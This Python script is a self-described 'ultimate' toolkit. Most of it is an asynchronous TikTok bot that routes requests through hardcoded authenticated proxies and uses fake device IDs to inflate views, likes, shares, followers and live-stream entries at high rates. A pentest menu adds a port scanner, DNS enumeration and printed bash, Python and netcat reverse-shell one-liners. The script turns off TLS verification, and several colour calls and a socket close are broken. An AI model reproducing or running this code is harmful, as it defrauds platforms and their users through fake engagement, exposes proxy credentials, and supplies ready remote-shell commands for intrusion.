#!/usr/bin/env python3
# =====================================================
# ULTIMATIVES PENETRATION + TIKTOK ASYNC BOT TOOLKIT v4.0
# Complete All-in-One Framework - 2026 Edition
# Asyncio + Proxies + SignerPy + FULL Pentesting Suite
# =====================================================

import os
import sys
import socket
import subprocess
import threading
import time
import requests
import json
import base64
import hashlib
import argparse
import socketserver
import asyncio
import aiohttp
import random
import re
import binascii
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import dns.resolver
from urllib.parse import urlparse, parse_qs, urlencode
import ssl
import paramiko
from cryptography.fernet import Fernet
import scapy.all as scapy
from colorama import init, Fore, Back, Style
from http import cookiejar
from urllib3.exceptions import InsecureRequestWarning

# Mock SignerPy (replace with real import if available)
class MockSignerPy:
    @staticmethod
    def XG(query, payload, ticket):
        return {"X-Gorgon": "0404b0d30000" + "0"*40, "X-Khronos": str(int(time.time()))}

try:
    import SignerPy
except ImportError:
    SignerPy = MockSignerPy

# Initialize everything
init(autoreset=True)
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context

# Global Banners & Colors
BANNER = f"""
{Fore.GREEN}
    ╔══════════════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}ULTIMATIVES ASYNC PENETRATION + TIKTOK BOT v4.0{Style.RESET_ALL} {Fore.GREEN}║
    ║  {Fore.CYAN}Asyncio • Proxies • SignerPy • 1000+ RPS • Full Pentest Suite{Style.RESET_ALL} {Fore.GREEN}║
    ╚══════════════════════════════════════════════════════════════════════╝
{Fore.WHITE}
    TikTok: Views•Likes•Shares•Followers•Live | Pentest: Recon•Scan•Exploit
    {Style.RESET_ALL}
"""

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# =====================================================
# STATE & PROXY MANAGER
# =====================================================

class State:
    success = 0
    fails = 0
    start_time = time.time()
    is_running = False
    target_id = ""
    
    # AUTHENTICATED PROXIES (Replace with your premium proxies)
    PROXIES = [
        "31.59.20.176:6754:hxidjrjw:nylyfhelpvdx", "198.23.239.134:6540:hxidjrjw:nylyfhelpvdx",
        "45.38.107.97:6014:hxidjrjw:nylyfhelpvdx", "107.172.163.27:6543:hxidjrjw:nylyfhelpvdx",
        "198.105.121.200:6462:hxidjrjw:nylyfhelpvdx", "216.10.27.159:6837:hxidjrjw:nylyfhelpvdx",
        "142.111.67.146:5611:hxidjrjw:nylyfhelpvdx", "191.96.254.138:6185:hxidjrjw:nylyfhelpvdx",
        "31.58.9.4:6077:hxidjrjw:nylyfhelpvdx", "23.26.71.145:5628:hxidjrjw:nylyfhelpvdx"
    ]

# =====================================================
# TIKTOK ASYNC ENGINE (COMPLETE)
# =====================================================

class TikTokEngine:
    def get_proxy(self):
        p = random.choice(State.PROXIES).split(':')
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"

    async def worker(self, session, sem, mode):
        endpoints = {
            "1": "https://api16-core-c-alisg.tiktokv.com/aweme/v1/aweme/stats/",
            "2": "https://api16-core-c-alisg.tiktokv.com/aweme/v1/commit/item/share/",
            "3": "https://api16-core-c-alisg.tiktokv.com/aweme/v1/aweme/collect/",
            "4": "https://api16-core-c-alisg.tiktokv.com/aweme/v1/commit/item/digg/",
            "5": "https://api16-core-c-alisg.tiktokv.com/aweme/v1/commit/follow/user/",
            "6": "https://webcast16-normal-useastred.tiktokv.eu/webcast/room/enter/"
        }
        
        while State.is_running:
            async with sem:
                try:
                    proxy = self.get_proxy()
                    did, iid = str(random.randint(10**18, 10**19)), str(random.randint(10**18, 10**19))
                    
                    params = {
                        "device_id": did, "iid": iid, "version_code": "400304",
                        "device_platform": "android", "aid": "1233",
                        "cdid": str(uuid.uuid4()), "openudid": binascii.hexlify(os.urandom(8)).decode()
                    }

                    payload = ""
                    if mode == "1": payload = f"item_id={State.target_id}&play_delta=1"
                    elif mode == "2": payload = f"item_id={State.target_id}&share_delta=1"
                    elif mode in ["3", "4"]: params["aweme_id"] = State.target_id
                    elif mode == "5": params["user_id"] = State.target_id
                    elif mode == "6":
                        params.update({"room_id": State.target_id, "store-idc": "no1a"})
                        payload = f"room_id={State.target_id}&hold_living_room=1"

                    query = urlencode(params)
                    sig = SignerPy.XG(query, payload, "d_ticket=27" if mode == "6" else "")
                    xg, xk = sig.get("X-Gorgon", ""), sig.get("X-Khronos", str(int(time.time())))

                    headers = {
                        "User-Agent": "com.ss.android.ugc.trill/400304 (Linux; U; Android 12; Pixel 6)",
                        "X-Gorgon": xg, "X-Khronos": xk,
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                    if mode == "6": headers["Cookie"] = "d_ticket=27"

                    async with session.post(endpoints[mode], params=params, data=payload, 
                                          headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10), 
                                          ssl=False) as r:
                        if r.status == 200:
                            resp = await r.json()
                            if resp.get("status_code") == 0:
                                State.success += 1
                                print(f"{Fore.GREEN}[SUCCESS] Mode {mode} | Total: {State.success}{Style.RESET_ALL}")
                            else:
                                State.fails += 1
                        else:
                            State.fails += 1
                except:
                    State.fails += 1
                await asyncio.sleep(0.001)

# =====================================================
# PENETESTING MODULES (COMPLETE FROM PREVIOUS)
# =====================================================

class ReconModule:
    @staticmethod
    def dns_enum(domain):
        print(f"{Fore.OKBLUE}[DNS] Enumerating {domain}{Style.RESET_ALL}")
        record_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SRV']
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                for record in answers:
                    print(f"  {Fore.OKGREEN}{rtype}: {record}{Style.RESET_ALL}")
            except:
                pass

class NetworkScanner:
    @staticmethod
    def port_scan(target):
        print(f"{Fore.OKBLUE}[PORTSCAN] {target}:1-1000{Style.RESET_ALL}")
        open_ports = []
        def scan_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target, port)) == 0:
                open_ports.append(port)
                print(f"{Fore.OKGREEN}Port {port} OPEN{Style.RESET_ALL}")
            sock.close
        
        with ThreadPoolExecutor(max_workers=200) as executor:
            executor.map(scan_port, range(1, 1001))
        return open_ports

class ExploitModule:
    @staticmethod
    def reverse_shells():
        shells = {
            "bash": "bash -i >& /dev/tcp/IP/PORT 0>&1",
            "python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
            "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f"
        }
        for name, shell in shells.items():
            print(f"{Fore.YELLOW}[{name.upper()}] {shell}{Style.RESET_ALL}")

# =====================================================
# UTILITY FUNCTIONS
# =====================================================

def get_room_id(username):
    """TikTok Room ID Resolver"""
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    url = f"https://www.tiktok.com/api-live/user/room/?aid=1988&uniqueId={username}"
    try:
        res = requests.get(url, headers=headers, timeout=10).json()
        return res["data"]["user"]["roomId"]
    except:
        return None

def live_stats():
    """Live statistics display"""
    while True:
        if State.is_running:
            elapsed = time.time() - State.start_time
            rps = State.success / elapsed if elapsed > 0 else 0
            print(f"\r{Fore.CYAN}[STATS] Success: {State.success} | Fails: {State.fails} | RPS: {rps:.1f}{Style.RESET_ALL}", end="")
        time.sleep(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(BANNER)

# =====================================================
# ASYNC TIKTOK MAIN LOOP
# =====================================================

async def tiktok_main(mode):
    """Async TikTok bot runner"""
    State.is_running = True
    State.success, State.fails = 0, 0
    State.start_time = time.time()
    
    threads = int(input(f"{Fore.YELLOW}Threads (100-2000): {Style.RESET_ALL}"))
    State.target_id = input(f"{Fore.YELLOW}Target ID/URL: {Style.RESET_ALL}")
    
    # Auto-extract ID from URL
    match = re.search(r'(\d{15,20})', State.target_id)
    if match:
        State.target_id = match.group(1)
    
    print(f"{Fore.GREEN}Starting {threads} threads on {State.target_id}...{Style.RESET_ALL}")
    
    sem = asyncio.Semaphore(threads)
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=1000)) as session:
        tasks = [TikTokEngine().worker(session, sem, mode) for _ in range(threads)]
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            State.is_running = False
            print(f"\n{Fore.YELLOW}Stopped! Success: {State.success}{Style.RESET_ALL}")

# =====================================================
# ULTIMATE MAIN MENU
# =====================================================

class UltimateToolkit:
    def __init__(self):
        self.recon = ReconModule()
    
    def tiktok_menu(self):
        """Complete TikTok Automation Menu"""
        while True:
            print_banner()
            print(f"{Fore.MAGENTA}╔{'═'*60}╗{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}║{Fore.RED}          TIKTOK ULTIMATE BOT{Style.RESET_ALL}{Fore.MAGENTA}║{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}╠{'═'*60}╣{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}║{Fore.GREEN} 1.{Style.RESET_ALL} {Fore.CYAN}Video Views (1000+ RPS){Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}║{Fore.GREEN} 2.{Style.RESET_ALL} {Fore.CYAN}Shares{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}║{Fore.GREEN} 3.{Style.RESET_ALL} {Fore.CYAN}Favorites{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}║{Fore.GREEN} 4.{Style.RESET_ALL} {Fore.CYAN}Likes/Hearts{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}║{Fore.GREEN} 5.{Style.RESET_ALL} {Fore.CYAN}Followers{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}║{Fore.GREEN} 6.{Style.RESET_ALL} {Fore.CYAN}Live Stream Entry{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}║{Fore.GREEN} 7.{Style.RESET_ALL} {Fore.YELLOW}Room ID Resolver{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}║{Fore.RED} 0.{Style.RESET_ALL} {Fore.WHITE}Back{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}╚{'═'*60}╝{Style.RESET_ALL}")
            
            choice = input(f"{Fore.BOLD}{Fore.YELLOW}>> {Style.RESET_ALL}").strip()
            
            if choice == "0":
                break
            elif choice == "7":
                username = input(f"{Fore.YELLOW}Username: {Style.RESET_ALL}")
                rid = get_room_id(username)
                print(f"{Fore.GREEN}Room ID: {rid}{Style.RESET_ALL}" if rid else f"{Fore.RED}User Offline{Style.RESET_ALL}")
            else:
                if sys.platform == 'win32':
                    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
                asyncio.run(tiktok_main(choice))
    
    def pentest_menu(self):
        """Pentesting Menu"""
        while True:
            print_banner()
            print(f"{Fore.BLUE}╔{'═'*60}╗{Style.RESET_ALL}")
            print(f"{Fore.BLUE}║{Fore.WHITE}        PENETRATION TESTING{Style.RESET_ALL}{Fore.BLUE}║{Style.RESET_ALL}")
            print(f"{Fore.BLUE}╠{'═'*60}╣{Style.RESET_ALL}")
            print(f"{Fore.BLUE}║{Fore.GREEN} 1.{Style.RESET_ALL} DNS Enumeration{Style.RESET_ALL}")
            print(f"{Fore.BLUE}║{Fore.GREEN} 2.{Style.RESET_ALL} Port Scanner{Style.RESET_ALL}")
            print(f"{Fore.BLUE}║{Fore.GREEN} 3.{Style.RESET_ALL} Reverse Shells{Style.RESET_ALL}")
            print(f"{Fore.BLUE}║{Fore.RED} 0.{Style.RESET_ALL} Back{Style.RESET_ALL}")
            print(f"{Fore.BLUE}╚{'═'*60}╝{Style.RESET_ALL}")
            
            choice = input(f"{Fore.YELLOW}>> {Style.RESET_ALL}").strip()
            
            if choice == "1":
                domain = input("Domain: ")
                self.recon.dns_enum(domain)
            elif choice == "2":
                target = input("Target IP: ")
                NetworkScanner.port_scan(target)
            elif choice == "3":
                ExploitModule.reverse_shells()
            elif choice == "0":
                break
            
            input(f"\n{Fore.YELLOW}Press Enter...{Style.RESET_ALL}")
    
    def run(self):
        """Main menu loop"""
        while True:
            print_banner()
            print(f"{Fore.RED}╔{'═'*80}╗{Style.RESET_ALL}")
            print(f"{Fore.RED}║{Fore.YELLOW}{'ULTIMATE TOOLKIT v4.0 - MAIN MENU':^78}{Style.RESET_ALL}{Fore.RED}║{Style.RESET_ALL}")
            print(f"{Fore.RED}╠{'═'*80}╣{Style.RESET_ALL}")
            print(f"{Fore.RED}║{Fore.GREEN} 1.{Style.RESET_ALL} {Fore.MAGENTA}TIKTOK BOT (Async 1000+ RPS){Style.RESET_ALL}")
            print(f"{Fore.RED}║{Fore.GREEN} 2.{Style.RESET_ALL} {Fore.BLUE}PENETESTING SUITE{Style.RESET_ALL}")
            print(f"{Fore.RED}║{Fore.GREEN} 3.{Style.RESET_ALL} {Fore.CYAN}Network Tools{Style.RESET_ALL}")
            print(f"{Fore.RED}║{Fore.RED} 0.{Style.RESET_ALL} {Fore.WHITE}Exit{Style.RESET_ALL}")
            print(f"{Fore.RED}╚{'═'*80}╝{Style.RESET_ALL}")
            
            choice = input(f"{Fore.BOLD}{Fore.RED}>> {Style.RESET_ALL}").strip()
            
            if choice == "1":
                self.tiktok_menu()
            elif choice == "2":
                self.pentest_menu()
            elif choice == "0":
                print(f"{Fore.GREEN}Goodbye!{Style.RESET_ALL}")
                sys.exit(0)

# =====================================================
# MAIN EXECUTION
# =====================================================

def main():
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    
    toolkit = UltimateToolkit()
    toolkit.run()

if __name__ == "__main__":
    main()
